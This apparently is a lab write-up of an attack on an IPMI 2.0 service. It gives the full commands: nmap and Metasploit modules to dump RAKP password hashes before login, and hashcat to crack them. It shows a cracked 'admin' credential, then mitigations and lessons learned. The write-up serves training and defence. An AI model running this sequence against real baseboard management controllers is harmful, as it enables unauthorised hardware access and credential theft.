## Target

| Field    | Value         |
| -------- | ------------- |
| IP       | 10.129.16.102 |
| Port     | 623/UDP       |
| Protocol | IPMI 2.0      |

---

## Phase 1 — Service Enumeration

**Tool:** Nmap with `ipmi-version` NSE script

```bash
sudo nmap -sU --script ipmi-version -p 623 10.129.16.102
```

**Findings:**

- IPMI version 2.0 confirmed
- Supported auth methods: `password`, `md5`, `md2`, `null`
- Levels: 1.5 and 2.0

Then confirmed via Metasploit:

```bash
use auxiliary/scanner/ipmi/ipmi_version
set rhosts 10.129.16.102
run
```

---

## Phase 2 — Hash Dumping (RAKP Flaw)

Exploited the **IPMI 2.0 RAKP protocol flaw** — the server sends a salted HMAC-SHA1 password hash before authentication completes, allowing unauthenticated hash retrieval for any valid user.

```bash
use auxiliary/scanner/ipmi/ipmi_dumphashes
set rhosts 10.129.16.102
run
```

**Retrieved hash:**

```
admin:e572c9fe...140561646d696e:e3a36f22bf89d51327aa0426471938a061791a4c
```

**Username found: `admin`**

---

## Phase 3 — Offline Hash Cracking

Stripped the username prefix and saved the raw hash:

```bash
echo "e572c9fe...140561646d696e:e3a36f22bf89d51327aa0426471938a061791a4c" > hash_only.txt
hashcat -m 7300 hash_only.txt /usr/share/wordlists/rockyou.txt
```

**Result:** Cracked in ~1 second

|Field|Value|
|---|---|
|Username|`admin`|
|Password|`trinity`|
|Hash mode|7300 (IPMI2 RAKP HMAC-SHA1)|
|Wordlist|rockyou.txt|
|Progress at crack|0.06% (8192/14M passwords)|

## Vulnerability Summary

|Vulnerability|Severity|Notes|
|---|---|---|
|IPMI 2.0 RAKP Hash Disclosure|Critical|Pre-auth hash retrieval for any valid user|
|Weak BMC Password|High|Cracked in <1 second with rockyou.txt|

---

## Impact
BMC access with valid credentials equals near-physical access to the host:

- Power on/off/reboot
- OS reinstall
- Hardware monitoring
- Potential password reuse across other services (SSH, web consoles, etc.)

---

## Mitigations
- Enforce long, complex, unique passwords on all BMCs
- Isolate IPMI interfaces via network segmentation (dedicated OOB network)
- Disable IPMI over LAN if remote access is not required
- Monitor port 623/UDP for unauthorized access attempts

---

## Lessons Learned
- The RAKP flaw is **by design** — no patch exists; defense is purely operational
- Always strip the username from the hash before passing to hashcat `-m 7300`; use `--username` flag or manually cut it
- Weak passwords on BMCs are extremely common in internal assessments — always check IPMI early in the engagement
- Cracked BMC credentials should always be tested for reuse across SSH, RDP, and web management interfaces
